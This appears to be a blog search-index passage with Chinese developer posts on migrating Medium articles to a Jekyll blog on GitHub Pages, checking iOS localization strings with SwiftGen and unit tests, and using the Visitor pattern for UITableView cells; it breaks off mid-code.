Analytics superProxy endpoint of Google App Engine cache_path: # the local PV cache data, friendly to visitors from GFW region# Prefer color scheme setting.## Note: Keep empty will follow the system prefer color by default,# and there will be a toggle to switch the theme between dark and light# on the bottom left of the sidebar.## Available options:## light - Use the light color scheme# dark - Use the dark color scheme#theme_mode: # [light|dark]# The CDN endpoint for images.# Notice that once it is assigned, the CDN url# will be added to all image (site avatar &amp; posts' images) paths starting with '/'## e.g. 'https://cdn.com'img_cdn:# the avatar on sidebar, support local or CORS resourcesavatar: '/assets/images/zhgchgli.jpg'# boolean type, the global switch for ToC in posts.toc: truecomments: active: disqus # The global switch for posts comments, e.g., 'disqus'. Keep it empty means disable # The active options are as follows: disqus: shortname: zhgchgli # fill with the Disqus shortname. › https://help.disqus.com/en/articles/1717111-what-s-a-shortname # utterances settings › https://utteranc.es/ utterances: repo: # &lt;gh-username&gt;/&lt;repo&gt; issue_term: # &lt; url | pathname | title | ...&gt; # Giscus options › https://giscus.app giscus: repo: # &lt;gh-username&gt;/&lt;repo&gt; repo_id: category: category_id: mapping: # optional, default to 'pathname' input_position: # optional, default to 'bottom' lang: # optional, default to the value of `site.lang`# Self-hosted static assets, optional › https://github.com/cotes2020/chirpy-static-assetsassets: self_host: enabled: # boolean, keep empty means false # specify the Jekyll environment, empty means both # only works if `assets.self_host.enabled` is 'true' env: # [development|production]paginate: 10# ------------ The following options are not recommended to be modified ------------------kramdown: syntax_highlighter: rouge syntax_highlighter_opts: # Rouge Options › https://github.com/jneen/rouge#full-options css_class: highlight # default_lang: console span: line_numbers: false block: line_numbers: true start_line: 1collections: tabs: output: true sort_by: orderdefaults: - scope: path: '' # An empty string here means all files in the project type: posts values: layout: post comments: true # Enable comments in posts. toc: true # Display TOC column in posts. # DO NOT modify the following parameter unless you are confident enough # to update the code of all other post links in this project. permalink: /posts/:title/ - scope: path: _drafts values: comments: false - scope: path: '' type: tabs # see `site.collections` values: layout: page permalink: /:title/ - scope: path: assets/img/favicons values: swcache: true - scope: path: assets/js/dist values: swcache: truesass: style: compressedcompress_html: clippings: all comments: all endings: all profile: false blanklines: false ignore: envs: [development]exclude: - '*.gem' - '*.gemspec' - tools - README.md - LICENSE - gulpfile.js - node_modules - package*.jsonjekyll-archives: enabled: [categories, tags] layouts: category: category tag: tag permalinks: tag: /tags/:name/ category: /categories/:name/請依照註解將設定替換成您的內容。 ⚠️ _config.yml 有調整都需要重新啟動本地網站！才會套用效果預覽網站依賴安裝完成後，可以下 bundle exec jekyll s 啟動本地網站：複製其中的網址 http://127.0.0.1:4000/ 貼到瀏覽器打開本地預覽成功！此 Terminal 開著，本地網站就開著，Terminal 會持續更新網站存取紀錄，方便我們除錯。我們可以再開一個新的 Termnial 做後續的其他操作。Jeklly 目錄結構依照樣板不同可能會有不同的資料夾跟設定檔案，文章目錄在： _posts/ ：文章會放在這個目錄下文章檔案命名規則： YYYY – MM – DD - 文章檔案名稱 .md assets/ ：網站資源目錄，網站用圖片或 文章內的圖片 都要放置於此其他目錄 _incloudes、_layouts、_sites、_tabs… 都可讓你做進階的擴充修改。Jeklly 使用 Liquid 做為頁面模板引擎，頁面模板是類似繼承方式組成：使用者可自由客製化頁面，引擎會先看使用者有沒有建立對應頁面的客製化檔案 -&gt; 如果沒有則看樣板有沒有 -&gt; 如果沒有就用原始的 Jekyll 樣式呈現。所以我們可以很輕易地對任何頁面做客製化，只需要在相對應的目錄建立一樣的檔案名稱即可！建立/編輯文章 我們可以先把 _posts/ 目錄下的範例文章檔案全數刪除。使用 Visual Code (免費) 或 Typora (付費) 建立 Markdown 檔案，這邊以 Visual Code 為例： 文章檔案命名規則： YYYY – MM – DD - 文章檔案名稱 .md 建議以英文為檔案名稱 (SEO 最佳化)，這個名稱就會是網址的路徑文章 內容頂部 Meta ：---layout: posttitle: \"安安\"description: ZhgChgLi 的第一篇文章date: 2022-07-16 10:03:36 +0800categories: Jeklly Lifeauthor: ZhgChgLitags: [ios]--- layout: post title: 文章標題 (og:title) description: 文章描述 (og:description) date: 文章發表時間 (不可以是未來) author: 作者 (meta:author) tags: 標籤 (可多個) categories: 分類 (單個，用空格區分子母分類 Jeklly Life -&gt; Jeklly 目錄下的 Life 目錄)文章內容 ：使用 Markdown 格式撰寫：---layout: posttitle: \"安安\"description: ZhgChgLi 的第一篇文章date: 2022-07-16 10:03:36 +0800categories: Jeklly Lifeauthor: ZhgChgLitags: [ios]---# HiHi!你好啊我是 **ZhgChgLi**圖片：![](/assets/post_images/DSC_2297.jpg)&gt; _有任何問題及指教歡迎 [與我聯絡](https://www.zhgchg.li/contact) 。_成果： ⚠️ 文章調整不需要重新啟動網站，檔案變更後會直接渲染顯示，如果過一陣子都沒出現修改內容，可能是文章內容格式有誤導致渲染失敗，可回到 Terminal 查看原因。從 Medium 下載文章並轉成 Markdown 放入 Jekyll有了基本的 Jekyll 知識後我們繼續向前邁進，使用 ZMediumToMarkdown 工具將現有在 Medium 網站上的文章下載並轉換成 Markdwon 格式放到我們的 Blog 資料夾中。cd 到 blog 目錄下後，下以下指令將 Medium 上的該使用者所有文章都下載下來：ZMediumToMarkdown -j 你的 Meidum 帳號等待所有文章下載完成。。。 如有遇到任何下載問題、意外出錯歡迎 與我聯絡 ，這個下載器是我撰寫的( 開發心得 )，可以最快速直接地幫你解決問題。下載完成後，回到本地網站就能預覽成果囉。完成！！我們已經無痛地將 Medium 文章導入到 Jekyll 囉！可以檢查一下文章有無跑版、圖片有無缺失，如果有一樣歡迎 回報給我 協助修復。上傳內容到 Repo本地預覽內容沒問題後，我們就要將內容 Push 到 Github Repo 囉。依序使用以下 Git 指令操作：git add .git commit -m \"update post\"git pushPush 完成後回到 Github 上，可以看到 Actions 有 CD 再跑：約等待 5 分鐘…部署完成！首次部署完成設定首次部署完成要更改以下設定：否則前往網站只會出現：--- layout: home # Index page ---「Save」後不會馬上生效，要回到「Actions」頁面再一次重新等待部署。重新部署完成後，就能成功進入網站了：Demo -&gt; zhgchg.li現在你也擁有一個免費的 Jekyll 個人 Blog 囉！！關於部署每次 Push 內容到 Repo 都會觸發重新部署，要等到部署成功，更改才會真正生效。綁定自訂網域如果不喜歡 zhgchgli0718.github.io Github 網址，可以從 Namecheap 購買您喜歡的網域或是使用 Dot.tk 註冊免費 .tk 結尾的網域。購買網域後進到網域後台：加上以下四個 Type A Record 紀錄A Record @ 185.199.108.153A Record @ 185.199.109.153A Record @ 185.199.110.153A Record @ 185.199.111.153網域後台新增好設定後，回到 Github Repo Settings：在 Custom domain 的地方填入你的網域，然後按「Save」。等待 DNS 通了之後，就可以用 zhgchg.li 取代掉原本的 github.io 網址。 ⚠️ DNS 設定至少需要 5 分鐘 ~ 72 小時才會生效，如果一直無法認證過；請稍後再試。雲端、全自動 Medium 同步機制每次有新文章都要用電腦手動跑 ZMediumToMarkdown 然後再 Push 到專案，嫌麻煩嗎？ZMediumToMarkdown 其實還提供貼心的 Github Action 功能 ，可以讓你解放電腦、全自動幫你同步 Medium 文章到你的網站上。前往 Repo 的 Actions 設定：點擊「New workflow」點擊「set up a workflow yourself」 檔案名稱修改為： ZMediumToMarkdown.yml 檔案內容如下：name: ZMediumToMarkdownon: workflow_dispatch: schedule: - cron: \"10 1 15 * *\" # At 01:10 on day-of-month 15.jobs: ZMediumToMarkdown: runs-on: ubuntu-latest steps: - name: ZMediumToMarkdown Automatic Bot uses: ZhgChgLi/ZMediumToMarkdown@main with: command: '-j 你的 Meidum 帳號' cron : 設定執行週期 (每週？每個月？每天？)，這邊是設定每個月 15 號凌晨 1:15 會自動執行 command: 填入你的 Medium 帳號在 -j 後面點擊右上方「Start commit」-&gt;「Commit new file」完成 Github Action 建立。建立完成後回到 Actions 就會出現 ZMediumToMarkdown Action。除了時間到自動執行外還可以依照以下步驟，手動觸發執行：Actions -&gt; ZMediumToMarkdown -&gt; Run workflow -&gt; Run workflow。執行後，ZMediumToMarkdown 就會直接透過 Github Action 的機器跑同步 Medium 文章到 Repo 的腳本：跑完後同樣會觸發重新部署，重新部署完成後到網站就會出現最新的內容了。🚀 完全無需人工操作！也就是說未來你還是可以繼續更新 Medium 文章，腳本都會貼心地自動幫你從雲端同步內容到你自己的網站上！我的 Blog Repo有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,229 Total Views Last Statistics Date: 2025-01-19 | 906 Views on Medium. " }, { "title": "iOS 為多語系字串買份保險吧！", "url": "/posts/48a8526c1300/", "categories": "ZRealm Dev.", "tags": "ios-app-development, localization, unit-testing, xcode, swift", "date": "2022-07-15 18:10:04 +0800", "snippet": "iOS 為多語系字串買份保險吧！使用 SwifGen &amp; UnitTest 確保多語系操作的安全Photo by Mick Haupt問題純文字檔案iOS 的多語系處理方式是 Localizable.strings 純文字檔案，不像 Android 是透過 XML 格式來管理；所以在日常開發上就會有不小心把語系檔改壞或是漏加的風險再加上多語系不會在 Build Time 檢查出錯誤，...", "content": "iOS 為多語系字串買份保險吧！使用 SwifGen &amp; UnitTest 確保多語系操作的安全Photo by Mick Haupt問題純文字檔案iOS 的多語系處理方式是 Localizable.strings 純文字檔案，不像 Android 是透過 XML 格式來管理；所以在日常開發上就會有不小心把語系檔改壞或是漏加的風險再加上多語系不會在 Build Time 檢查出錯誤，往往都是上線後，某個地區的使用者回報才發現問題，會大大降低使用者信心程度。之前血淋淋的案例，大家 Swift 寫的太習慣忘記 Localizable.strings 要加 ; ，導致某個語系上線後從漏掉 ; 的語句往後全壞掉；最後緊急 Hotfix 才化險為夷。多語系有問題就會直接把 Key 顯示給使用者如上圖所示，假設 DESCRIPTION Key 漏加， App就會直接顯示 DESCRIPTION 給使用者。檢查需求 Localizable.strings 格式正確檢查 (換行結尾需加上 ; 、合法 Key Value 對應) 程式碼中有取用的多語系 Key 要在 Localizable.strings 檔有對應定義 Localizable.strings 檔各個語系都要有相應的 Key Value 紀錄 Localizable.strings 檔不能有重複的 Key (否則 Value 會被意外覆蓋)解決方案使用 Swift 撰寫完整檢查工具之前的做法是「 Xcode 直接使用 Swift 撰寫 Shell Script！ 」參考 Localize 🏁 工具使用 Swift 開發 Command Line Tool 從外部做多語系檔案檢查，再把腳本放到 Build Phases Run Script 中，在 Build Time 執行檢查。優點： 檢查程式是由外部注入，不依賴在專案上，可以不透過 XCode、不需 Build 專案也能執行檢查、檢查功能能精確到哪個檔案的第幾行；另外還能做 Format 功能 (排序多語系 Key A-&gt;Z)。缺點： 增加 Build Time ( + ~= 3 mins)、流程發散，腳本有問題或需因應專案架構調整時難以交接維護，因這塊不在專案內，除了加入這段檢查進來的人知道整個邏輯，其他協作者很難碰觸到這塊。 有興趣的朋友可以參考之前的那篇文章，本篇主要介紹的方式是透過 XCode 13+SwiftGen+UnitTest 來達成檢查 Localizable.strings 的所有功能。XCode 13 內建 Build Time 檢查 Localizable.strings 檔案格式正確性升級 XCode 13 之後就內建了 Build Time 檢查 Localizable.strings 檔案格式的功能，經測試檢查的規格相當完整，除了漏掉 ; 外如有多餘無意義的字串也會被擋下來。使用 SwiftGen 取代原始 NSLocalizedString String Base 存取方式SwiftGen 能幫助我們將原本的 NSLocalizedString String 存取方式改成 Object 存取，防止不小心打錯字、忘記在 Key 宣告的情況出現。SwiftGen 核心也是 Command Line Tool；但是這工具在業界蠻流行的而且有完整的文件及社群資源在維護，不必害怕導入這個工具後續難維護的問題。Installation可依照您的環境或 CI/CD 服務設定去選擇安裝方式，這邊 Demo 直接用最直接的 CocoaPods 進行安裝。 請注意 SwiftGen 並不是真的 CocoaPods，他不會跟專案中的程式碼有任何依賴；使用 CocoaPods 安裝 SwiftGen 單純只是透過它下載這個 Command Line Tool 執行檔回來。在 podfile 中加入 swiftgen pod：pod 'SwiftGen', '~&gt; 6.0'Initpod install 之後打開 Terminal cd 到專案下/L10NTests/Pods/SwiftGen/bin/swiftGen config initinit swiftgen.yml 設定檔，並打開它strings: - inputs: - \"L10NTests/Supporting Files/zh-Hant.lproj/Localizable.strings\" outputs: templateName: structured-swift5 output: \"L10NTests/Supporting Files/SwiftGen-L10n.swift\" params: enumName: \"L10n\"貼上並修改成符合您專案的格式：inputs: 專案語系檔案位置 (建議指定 DevelopmentLocalization 語系的語系檔)outputs: output: 轉換結果的 swift 檔案位置params: enumName: 物件名稱templateName: 轉換模板可以下 swiftGen template list 取得內建的模板列表flat v.s. structured差別在如果 Key 風格是 XXX.YYY.ZZZ flat 模板會轉換成小駝峰；structured 模板會照原始風格轉換成 XXX.YYY.ZZZ 物件。純 Swift 專案可直接使用內建模板，但若是 Swift 混 OC 的專案就需要自行客製化模板：flat-swift5-objc.stencil :// swiftlint:disable all// Generated using SwiftGen — https://github.com/SwiftGen/SwiftGen{% if tables.count &gt; 0 %}{% set accessModifier %}{% if param.publicAccess %}public{% else %}internal{% endif %}{% endset %}import Foundation// swiftlint:disable superfluous_disable_command file_length implicit_return// MARK: - Strings{% macro parametersBlock types %}{% filter removeNewlines:\"leading\" %} {% for type in types %} {% if type == \"String\" %} _ p{{forloop.counter}}: Any {% else %} _ p{{forloop.counter}}: {{type}} {% endif %} {{ \", \" if not forloop.last }} {% endfor %}{% endfilter %}{% endmacro %}{% macro argumentsBlock types %}{% filter removeNewlines:\"leading\" %} {% for type in types %} {% if type == \"String\" %} String(describing: p{{forloop.counter}}) {% elif type == \"UnsafeRawPointer\" %} Int(bitPattern: p{{forloop.counter}}) {% else %} p{{forloop.counter}} {% endif %} {{ \", \" if not forloop.last }} {% endfor %}{% endfilter %}{% endmacro %}{% macro recursiveBlock table item %} {% for string in item.strings %} {% if not param.noComments %} {% for line in string.translation|split:\"\\n\" %} /// {{line}} {% endfor %} {% endif %} {% if string.types %} {{accessModifier}} static func {{string.key|swiftIdentifier:\"pretty\"|lowerFirstWord|escapeReservedKeywords}}({% call parametersBlock string.types %}) -&gt; String { return {{enumName}}.tr(\"{{table}}\", \"{{string.key}}\", {% call argumentsBlock string.types %}) } {% elif param.lookupFunction %} {# custom localization function is mostly used for in-app lang selection, so we want the loc to be recomputed at each call for those (hence the computed var) #} {{accessModifier}} static var {{string.key|swiftIdentifier:\"pretty\"|lowerFirstWord|escapeReservedKeywords}}: String { return {{enumName}}.tr(\"{{table}}\", \"{{string.key}}\") } {% else %} {{accessModifier}} static let {{string.key|swiftIdentifier:\"pretty\"|lowerFirstWord|escapeReservedKeywords}} = {{enumName}}.tr(\"{{table}}\", \"{{string.key}}\") {% endif %} {% endfor %} {% for child in item.children %} {% call recursiveBlock table child %} {% endfor %}{% endmacro %}// swiftlint:disable function_parameter_count identifier_name line_length type_body_length{% set enumName %}{{param.enumName|default:\"L10n\"}}{% endset %}@objcMembers {{accessModifier}} class {{enumName}}: NSObject { {% if tables.count &gt; 1 or param.forceFileNameEnum %} {% for table in tables %} {{accessModifier}} enum {{table.name|swiftIdentifier:\"pretty\"|escapeReservedKeywords}} { {% filter indent:2 %}{% call recursiveBlock table.name table.levels %}{% endfilter %} } {% endfor %} {% else %} {% call recursiveBlock tables.first.name tables.first.levels %} {% endif %}}// swiftlint:enable function_parameter_count identifier_name line_length type_body_length// MARK: - Implementation Detailsextension {{enumName}} { private static func tr(_ table: String, _ key: String, _ args: CVarArg...) -&gt; String { {% if param.lookupFunction %} let format = {{ param.lookupFunction }}(key, table) {% else %} let format = {{param.bundle|default:\"BundleToken.bundle\"}}.localizedString(forKey: key, value: nil, table: table) {% endif %} return String(format: format, locale: Locale.current, arguments: args) }}{% if not param.bundle and not param.lookupFunction %}// swiftlint:disable convenience_typeprivate final class BundleToken { static let bundle: Bundle = { #if SWIFT_PACKAGE return Bundle.module #else return Bundle(for: BundleToken.self) #endif }()}// swiftlint:enable convenience_type{% endif %}{% else %}// No string found{% endif %}以上提供一個網路搜集來&amp;客製化過兼容 Swift 和 OC 的模板，可自行建立 flat-swift5-objc.stencil File 然後貼上內容或 點此直接下載 .zip 。使用客製化模板的話就不是用 templateName 了，而要改宣告 templatePath：swiftgen.yml :strings: - inputs: - \"L10NTests/Supporting Files/zh-Hant.lproj/Localizable.strings\" outputs: templatePath: \"path/to/flat-swift5-objc.stencil\" output: \"L10NTests/Supporting Files/SwiftGen-L10n.swift\" params: enumName: \"L10n\"將 templatePath 路徑指定到 .stencil 模板在專案中的位置即可。Generator設定好之後可以回到 Termnial 手動下：/L10NTests/Pods/SwiftGen/bin/swiftGen執行轉換，第一次轉換後請手動從 Finder 將轉換結果檔案 (SwiftGen-L10n.swift) 拉到專案中，程式才能使用。Run Script在專案設定中 -&gt; Build Phases -&gt; + -&gt; New Run Script Phases -&gt; 貼上：if [[ -f \"${PODS_ROOT}/SwiftGen/bin/swiftgen\" ]]; then echo \"${PODS_ROOT}/SwiftGen/bin/swiftgen\" \"${PODS_ROOT}/SwiftGen/bin/swiftgen\"else echo \"warning: SwiftGen is not installed. Run 'pod install --repo-update' to install it.\"fi這樣在每次 Build 專案時都會跑 Generator 產出最新的轉換結果。CodeBase 中如何使用?L10n.homeTitleL10n.homeDescription(\"ZhgChgLi\") // with arg 有了 Object Access 後就不可能出現打錯字及 Code 裡面有在用的 Key 但 Localizable.strings 檔忘記宣告的情況。 但 SwiftGen 只能指定從某個語系產生，所以無法阻擋產生的語系有這個 Key 但在其他語系忘記定義的狀況；此狀況要用下面的 UnitTest 才能保護。轉換轉換才是這個問題最困難的地方，因為已開發完成的專案中大量使用 NSLocalizedString 要將其轉換成新的 L10n.XXX 格式、如果是有帶參數的語句又更複雜 String(format: NSLocalizedString ，另外如果有混 OC 還要考慮 OC 的語法與 Swift 不同。沒有什麼特別的解法，只能自己寫一個 Command Line Tools，可參考 上一篇文章 中使用 Swift 掃描專案目錄、Parse 出 NSLocalizedString 的 Regex 撰寫一個小工具去轉換。建議一次轉換一個情境，能 Build 過再轉換下一個。 Swift -&gt; NSLocalizedString 無參數 Swift -&gt; NSLocalizedString 有參數情況 OC -&gt; NSLocalizedString 無參數 OC -&gt; NSLocalizedString 有參數情況透過 UnitTest 檢查各語系檔與主要語系檔案有沒有缺漏及 Key 有無重複我們可以透過撰寫 UniTest 從 Bundle 讀取出 .strings File 內容，並加以測試。從 Bundle 讀取出 .strings 並轉成物件：class L10NTestsTests: XCTestCase { private var localizations: [Bundle: [Localization]] = [:] override func setUp() { super.setUp() let bundles = [Bundle(for: type(of: self))] // bundles.forEach { bundle in var localizations: [Localization] = [] bundle.localizations.forEach { lang in var localization = Localization(lang: lang) if let lprojPath = bundle.path(forResource: lang, ofType: \"lproj\"), let lprojBundle = Bundle(path: lprojPath) { let filesInLPROJ = (try? FileManager.default.contentsOfDirectory(atPath: lprojBundle.bundlePath)) ?? [] localization.localizableStringFiles = filesInLPROJ.compactMap { fileFullName -&gt; L10NTestsTests.Localization.LocalizableStringFile? in let fileName = URL(fileURLWithPath: fileFullName).deletingPathExtension().lastPathComponent let fileExtension = URL(fileURLWithPath: fileFullName).pathExtension guard fileExtension == \"strings\" else { return nil } guard let path = lprojBundle.path(forResource: fileName, ofType: fileExtension) else { return nil } return L10NTestsTests.Localization.LocalizableStringFile(name: fileFullName, path: path) } localization.localizableStringFiles.enumerated().forEach { (index, localizableStringFile) in if let fileContent = try? String(contentsOfFile: localizableStringFile.path, encoding: .utf8) { let lines = fileContent.components(separatedBy: .newlines) let pattern = \"\\\"(.*)\\\"(\\\\s*)(=){1}(\\\\s*)\\\"(.+)\\\";\" let regex = try? NSRegularExpression(pattern: pattern, options: []) let values = lines.compactMap { line -&gt; Localization.LocalizableStringFile.Value? in let range = NSRange(location: 0, length: (line as NSString).length) guard let matches = regex?.firstMatch(in: line, options: [], range: range) else { return nil } let key = (line as NSString).substring(with: matches.range(at: 1)) let value = (line as NSString).substring(with: matches.range(at: 5)) return Localization.LocalizableStringFile.Value(key: key, value: value) } localization.localizableStringFiles[index].values = values } } localizations.append(localization) } } self.localizations[bundle] = localizations } }}private extension L10NTestsTests { struct Localization: Equatable { struct LocalizableStringFile { struct Value { let key: String let value: String } let name: String let path: String var values: [Value] = [] } let lang: String var localizableStringFiles: [LocalizableStringFile] = [] static func == (lhs: Self, rhs: Self) -&gt; Bool { return lhs.lang == rhs.lang } }}我們定義我們定義了一個 Localization 來存放頗析出來的資料，從 Bundle 中去找 lproj 再從其中找出 .strings 然後再使用正則表示法將多語系語句轉換成物件放回到 Localization ，以利後續測試使用。這邊有幾個需要注意的： 使用 Bundle(for: type(of: self)) 從 Test Target 取得資源 記得將 Test Target 的 STRINGS_FILE_OUTPUT_ENCODING 設為 UTF-8 ，否則使用 String 讀取檔案內容時會失敗 (預設會是 Biniary) 使用 String 讀取而不用 NSDictionary 的原因是，我們需要測試重複的 Key，使用 NSDictionary 會在讀取的時候就蓋掉重複的 Key 了 記得 .strings File 要增加 Test TargetTestCase 1. 測試同一個 .strings 檔案內有無重複定義的 Key：func testNoDuplicateKeysInSameFile() throws { localizations.forEach { (_, localizations) in localizations.forEach { localization in localization.localizableStringFiles.forEach { localizableStringFile in let keys = localizableStringFile.values.map { $0.key } let uniqueKeys = Set(keys) XCTAssertTrue(keys.count == uniqueKeys.count, \"Localized Strings File: \\(localizableStringFile.path) has duplicated keys.\") } } }}Input:Result:TestCase 2. 與 DevelopmentLocalization 語言相比，有無缺少/多餘的 Key：func testCompareWithDevLangHasMissingKey() throws { localizations.forEach { (bundle, localizations) in let developmentLang = bundle.developmentLocalization ?? \"en\" if let developmentLocalization = localizations.first(where: { $0.lang == developmentLang }) { let othersLocalization = localizations.filter { $0.lang != developmentLang } developmentLocalization.localizableStringFiles.forEach { developmentLocalizableStringFile in let developmentLocalizableKeys = Set(developmentLocalizableStringFile.values.map { $0.key }) othersLocalization.forEach { otherLocalization in if let otherLocalizableStringFile = otherLocalization.localizableStringFiles.first(where: { $0.name == developmentLocalizableStringFile.name }) { let otherLocalizableKeys = Set(otherLocalizableStringFile.values.map { $0.key }) if developmentLocalizableKeys.count &lt; otherLocalizableKeys.count { XCTFail(\"Localized Strings File: \\(otherLocalizableStringFile.path) has redundant keys.\") } else if developmentLocalizableKeys.count &gt; otherLocalizableKeys.count { XCTFail(\"Localized Strings File: \\(otherLocalizableStringFile.path) has missing keys.\") } } else { XCTFail(\"Localized Strings File not found in Lang: \\(otherLocalization.lang)\") } } } } else { XCTFail(\"developmentLocalization not found in Bundle: \\(bundle)\") } }}Input: (相較 DevelopmentLocalization 其他語系缺少宣告 Key)Output:Input: (DevelopmentLocalization 沒有這個 Key，但在其他語系出現)Output:總結綜合以上方式，我們使用： 新版 XCode 幫我們確保 .strings 檔案格式正確性 ✅ SwiftGen 確保 CodeBase 引用多語系時不會打錯或沒宣告就引用 ✅ UnitTest 確保多語系內容正確性 ✅優點： 執行速度快，不拖累 Build Time 只要是 iOS 開發者都會維護進階Localized File Format這個解決方案無法達成，還是需使用原本 用 Swift 寫的 Command Line Tool 來達成 ，不過 Format 部分可以在 git pre-commit 做就好；沒有 diff 調整就不做，避免每次 build 都要跑一次：#!/bin/shdiffStaged=${1:-\\-\\-staged} # use $1 if exist, default --staged.git diff --diff-filter=d --name-only $diffStaged | grep -e 'Localizable.*\\.\\(strings\\|stringsdict\\)$' | \\ while read line; do // do format for ${line}done.stringdict同樣的原理也可用在 .stringdict 上CI/CDswiftgen 可以不用放在 build phase，因為每次 build 都會跑一次，而且 Build 完程式碼才會出現，可以改成有調整再下指令產生就好。明確得到錯在哪個 Key可優化 UnitTest 的程式，使之能輸出明確是哪個 Key Missing/Reductant/Duplicate。使用第三方工具讓工程師完全解放多語系工作如同之前「 2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密 」的演講內容，在大團隊中多語系工作可以透過第三方服務拆開，多語系工作的依賴關係。工程師只需定義好 Key，多語系會在 CI/CD 階段從平台自動匯入，少了人工維護的階段；也比較不容易出錯。Special ThanksWei Cao , iOS Developer @ Pinkoi有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,064 Total Views Last Statistics Date: 2025-01-19 | 965 Views on Medium. " }, { "title": "Visitor Pattern in TableView", "url": "/posts/60473cb47550/", "categories": "ZRealm Dev.", "tags": "ios-app-development, design-patterns, visitor-pattern, uitableview, refactoring", "date": "2022-07-08 15:58:30 +0800", "snippet": "Visitor Pattern in TableView使用 Visitor Pattern 增加 TableView 的閱讀和擴充性Photo by Alex wong前言接上篇「 Visitor Pattern in Swift 」介紹 Visitor 模式及一個簡單的實務應用場景，此篇將介紹另一個在 iOS 需求開發上的實際應用。需求場景要開發一個動態牆功能，有多種不同類型的區塊需要動...", "content": "Visitor Pattern in TableView使用 Visitor Pattern 增加 TableView 的閱讀和擴充性Photo by Alex wong前言接上篇「 Visitor Pattern in Swift 」介紹 Visitor 模式及一個簡單的實務應用場景，此篇將介紹另一個在 iOS 需求開發上的實際應用。需求場景要開發一個動態牆功能，有多種不同類型的區塊需要動態組合顯示。以 StreetVoice 的動態牆為例：如上圖所示，動態牆是由多種不同類型的區塊動態組合而成： Type A: 活動動態 Type B: 追蹤推薦 Type C: 新歌動態 Type D: 新專輯動態 Type E: 新追縱動態 Type …. 更多類型可預期會在未來隨著功能迭代越來越多。問題在沒有任何架構設計的情況下 Code 可能會長這樣：func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&gt; UITableViewCell { let row = datas[indexPath.row] switch row.type { case .invitation: let cell = tableView.dequeueReusableCell(withIdentifier: \"invitation\", for: indexPath) as! InvitationCell // config cell with viewObject/viewModel... return cell case .newSong: let cell = tableView.dequeueReusableCell(withIdentifier: \"newSong\", for: indexPath) as! NewSongCell // config cell with viewObject/viewModel... return cell case .newEvent: let cell = tableView.dequeueReusableCell(withIdentifier: \"newEvent\", for: indexPath) as! NewEventCell // config cell with viewObject/viewModel... return cell case .newText: let cell = tableView.dequeueReusableCell(withIdentifier: \"newText\", for: indexPath) as! NewTextCell // config cell with viewObject/viewModel... return cell case .newPhotos: let cell = tableView.dequeueReusableCell(withIdentifier: \"newPhotos\", for: indexPath) as! NewPhotosCell // config cell with viewObject/viewModel... return cell }}func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -&gt; CGFloat { let row = datas[indexPath.row] switch row.type { case .invitation: if row.isEmpty { return 100 } else { return 300 } case .newSong: return 100 case .newEvent: return 200 case .newText: return UITableView.automaticDimension case .newPhotos: return UITableView.automaticDimension }} 難以測試：什麼 Type 有什麼對應的邏輯輸出難以測試 難以擴充維護：需要新增新 Type 時，都要更動此 ViewController；cellForRow、heightForRow、willDisplay…四散在各個 Function 內，難保忘記改，或改錯 難以閱讀：全部邏輯都在 View 身上Visitor Pattern 解決方案Why?整理了一下物件關係，如下圖所示：我們有許多種類型的 DataSource (ViewObject) 需要與多種類型的操作器做交互，是一個很典型的 Visitor Double Dispatch 。How?為簡化 Demo Code 以下改用 PlainTextFeedViewObject 純文字動態、 MemoriesFeedViewObject 每日回憶、 MediaFeedViewObject 圖片動態，呈現設計。套用 Visitor Pattern 的架構圖如下：首先定義出 Visitor 介面，此介面用途是抽象宣告出操作器能接受的 DataSource 類型：protocol FeedVisitor { associatedtype T func visit(_ viewObject: PlainTextFeedViewObject) -&gt; T? func visit(_ viewObject: MediaFeedViewObject) -&gt; T? func visit(_ viewObject: MemoriesFeedViewObject) -&gt; T? //...}各操作器實現 FeedVisitor 介面：struct FeedCellVisitor: FeedVisitor { typealias T = UITableViewCell.Type func visit(_ viewObject: MediaFeedViewObject) -&gt; T? { return MediaFeedTableViewCell.self } func visit(_ viewObject: MemoriesFeedViewObject) -&gt; T? { return MemoriesFeedTableViewCell.self } func visit(_ viewObject: PlainTextFeedViewObject) -&gt; T? { return PlainTextFeedTableViewCell.self }}實現 ViewObject &lt;-&gt; UITableViewCell 對應。struct FeedCellHeightVisitor: FeedVisitor { typealias T = CGFloat func visit(_ viewObject: MediaFeedViewObject) -&gt; T? { return 30 } func visit(_ viewObject: MemoriesFeedViewObject) -&gt; T? { return 10 } func visit(_ viewObject: PlainTextFeedViewObject) -&gt; T? { return 10 }}實現 ViewObject &lt;-&gt; UITableViewCell Height 對應。struct FeedCellConfiguratorVisitor: FeedVisitor { private let cell: UITableViewCell init(cell: UITableViewCell) { self.cell = cell } func visit(_ viewObject: MediaFeedViewObject) -&gt; Any? { guard let cell = cell as? MediaFeedTableViewCell else { return nil } // cell.config(viewObject) return nil } func visit(_ viewObject: MemoriesFeedViewObject) -&gt; Any? { guard let cell = cell as? MediaFeedTableViewCell else { return nil } // cell.config(viewObject) return nil } func visit(_ viewObject: PlainTextFeedViewObject) -&gt; Any? { guard let cell = cell as? MediaFeedTableViewCell else { return nil } // cell.config(viewObject) return nil }}實現 ViewObject &lt;-&gt; Cell 如何 Config 對應。當需要支援新的 DataSource (ViewObject) 時，只需在 FeedVisitor 介面上多加一個開口，並在各操作器中實現對應的邏輯。DataSource (ViewObject) 與操作器的綁定：protocol FeedViewObject { @discardableResult func accept&lt;V: FeedVisitor&gt;(visitor: V) -&gt; V.T?}ViewObject 實現綁定的介面：struct PlainTextFeedViewObject: FeedViewObject { func accept&lt;V&gt;(visitor: V) -&gt; V.T? where V : FeedVisitor { return visitor.visit(self) }}struct MemoriesFeedViewObject: FeedViewObject { func accept&lt;V&gt;(visitor: V) -&gt; V.T? where V : FeedVisitor { return visitor.visit(self) }}UITableView 中的實現：final class ViewController: UIViewController { @IBOutlet weak var tableView: UITableView! private let cellVisitor = FeedCellVisitor() private var viewObjects: [FeedViewObject] = [] { didSet { viewObjects.forEach { viewObject in let cellName = viewObject.accept(visitor: cellVisitor) tableView.register(cellName, forCellReuseIdentifier: String(describing: cellName)) } } } override func viewDidLoad() { super.viewDidLoad() tableView.delegate = self tableView.dataSource = self viewObjects = [ MemoriesFeedViewObject(), 